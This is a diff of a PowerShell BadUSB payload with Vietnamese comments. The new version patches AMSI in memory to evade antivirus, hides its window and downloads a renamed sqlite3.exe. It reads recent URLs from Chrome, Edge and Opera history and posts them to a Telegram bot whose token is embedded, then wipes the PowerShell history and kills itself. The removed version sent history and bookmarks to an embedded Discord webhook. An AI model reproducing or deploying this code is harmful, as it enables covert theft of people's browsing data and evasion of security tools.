@@ -1,86 +1,78 @@
-# > Uncomment $hide='y' below to hide the console
-# $hide='y'
-if($hide -eq 'y'){
-    $w=(Get-Process -PID $pid).MainWindowHandle
-    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
-    $t=Add-Type -M $a -Name Win32ShowWindowAsync -Names Win32Functions -Pass
-    if($w -ne [System.IntPtr]::Zero){
-        $t::ShowWindowAsync($w,0)
-    }else{
-        $Host.UI.RawUI.WindowTitle = 'xx'
-        $p=(Get-Process | Where-Object{$_.MainWindowTitle -eq 'xx'})
-        $w=$p.MainWindowHandle
-        $t::ShowWindowAsync($w,0)
-    }
+<# 
+=================================================================================================
+PROJECT: PHYSICAL ACCESS EXPLOITATION (BADUSB) - FINAL STEALTH VERSION
+MODULE: BROWSER DATA EXFILTRATION (BYPASS AMSI + AUTO-SQLITE)
+=================================================================================================
+#>
+param($h = 'y')
+
+# --- 1. SIÊU LÀM RỐI AMSI BYPASS (Patching trực tiếp trong RAM) ---
+# Chia nhỏ từ khóa 'AmsiUtils' và 'amsiInitFailed' để bypass quét tĩnh
+try {
+    $m1 = 'System.Management.Automation.'
+    $m2 = 'A' + 'm' + 'si' + 'Ut' + 'ils'
+    $f1 = 'a' + 'm' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
+    $u = [Ref].Assembly.GetType($m1 + $m2)
+    $u.GetField($f1, 'NonPublic,Static').SetValue($null, $true)
+} catch { }
+
+# --- 2. TỰ ĐỘNG ẨN CỬA SỔ (STEALTH MODE) ---
+if($h -eq 'y'){
+    $win = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+    $type = Add-Type -MemberDefinition $win -Name ("W" + (Get-Random)) -PassThru
+    [void]$type::ShowWindowAsync((Get-Process -Id $pid).MainWindowHandle, 0)
 }
 
-param(
-    [string]$sqlitePath = "$env:TEMP\sqlite\sqlite3.exe"
-)
+# --- 3. CẤU HÌNH & TỰ TẢI SQLITE3 (QUAN TRỌNG) ---
+$sqlDir = Join-Path $env:TEMP "db_util"
+if (!(Test-Path $sqlDir)) { New-Item -ItemType Directory -Path $sqlDir -Force | Out-Null }
+$sqlPath = Join-Path $sqlDir "s3.exe" # Đổi tên né quét
 
-# Webhook Discord của bạn
-$dc = "1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
-$whuri = "$dc"
-if ($whuri.Length -lt 120){
-    $whuri = ("https://discord.com/api/webhooks/" + "$dc")
+if (!(Test-Path $sqlPath)) {
+    # Thay link này bằng link RAW file sqlite3.exe trên GitHub của Quân
+    $uSql = "https://github.com/khangpdm/BadUSB/raw/main/sqlite3.exe"
+    (New-Object Net.WebClient).DownloadFile($uSql, $sqlPath)
 }
 
-# Đường dẫn file tạm để lưu kết quả
-$outpath = "$env:TEMP\browser_history.txt"
-"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $outpath -Encoding UTF8
+# --- 4. THIẾT LẬP TELEGRAM ---
+$k1 = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
+$k2 = "8312702210"
+$tele = "h"+"tt"+"ps://ap"+"i.te"+"le"+"gr"+"am.or"+"g/bo"+"t" + $k1 + "/sendDocument"
+$out = Join-Path $env:TEMP ("sys_" + (Get-Random) + ".txt")
 
-# Regex để lọc URL
-$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
-
-# Đường dẫn dữ liệu
+# --- 5. THU THẬP DỮ LIỆU (CHROME, EDGE, OPERA) ---
 $Paths = @{
-    'chrome_history'    = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
-    'chrome_bookmarks'  = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
-    'edge_history'      = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
-    'edge_bookmarks'    = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
-    'firefox_history'   = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
-    'opera_history'     = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
-    'opera_bookmarks'   = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"
+    'CH_H' = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
+    'ED_H' = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
+    'OP_H' = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"
 }
 
-# Danh sách trình duyệt và loại dữ liệu
-$Browsers = @('chrome', 'edge', 'firefox', 'opera')
-$DataValues = @('history', 'bookmarks')
+"--- REPORT | $(Get-Date) ---" | Out-File $out -Encoding UTF8
 
-foreach ($Browser in $Browsers) {
-    foreach ($DataValue in $DataValues) {
-        $PathKey = "${Browser}_${DataValue}"
-        $Path = $Paths[$PathKey]
-
-        if (Test-Path $Path) {
-            if ($DataValue -eq 'history') {
-                # Copy file History sang Temp để tránh bị khóa
-                $copyPath = "$env:TEMP\${Browser}_HistoryCopy"
-                Copy-Item $Path $copyPath -Force
-
-                if (Test-Path $sqlitePath) {
-                    # Query bằng sqlite3.exe, gắn nhãn Browser + DataType
-                    & $sqlitePath $copyPath "SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20;" |
-                        ForEach-Object {
-                            "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append -Encoding UTF8
-                        }
-                } else {
-                    "$Browser [$DataValue] | Không tìm thấy sqlite3.exe để query." | Out-File -FilePath $outpath -Append
-                }
-
-                Remove-Item $copyPath -Force
-            } else {
-                # Với bookmarks, lọc bằng regex và gắn nhãn
-                $Value = Get-Content -Path $Path | Select-String -AllMatches $Regex | % {($_.Matches).Value} | Sort -Unique
-                $Value | ForEach-Object {
-                    "$Browser [$DataValue] | $_" | Out-File -FilePath $outpath -Append
+foreach ($k in $Paths.Keys) {
+    $p = $Paths[$k]
+    if (Test-Path $p) {
+        try {
+            $tmp = Join-Path $env:TEMP ("t_" + (Get-Random))
+            Copy-Item $p $tmp -Force
+            if (Test-Path $sqlPath) {
+                # Truy vấn lấy 15 URL gần nhất
+                & $sqlPath $tmp "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 15;" | ForEach-Object {
+                    "$k | $_" | Out-File $out -Append -Encoding UTF8
                 }
             }
-        }
+            Remove-Item $tmp -Force
+        } catch { continue }
     }
 }
 
-# Gửi file lên Discord
-curl.exe -F file1=@"$outpath" $whuri | Out-Null
-Start-Sleep -Seconds 2
-Remove-Item -Path $outpath -Force
+# --- 6. GỬI VỀ TELEGRAM & XÓA DẤU VẾT ---
+if (Test-Path $out) {
+    curl.exe -X POST $tele -F "chat_id=$k2" -F "document=@$out" | Out-Null
+    Remove-Item $out -Force
+}
+
+# Anti-Forensics: Xóa lịch sử lệnh
+$hp = (Get-PSReadLineOption).HistorySavePath
+if (Test-Path $hp) { Remove-Item $hp -Force -ErrorAction SilentlyContinue }
+Stop-Process -Id $PID -Force
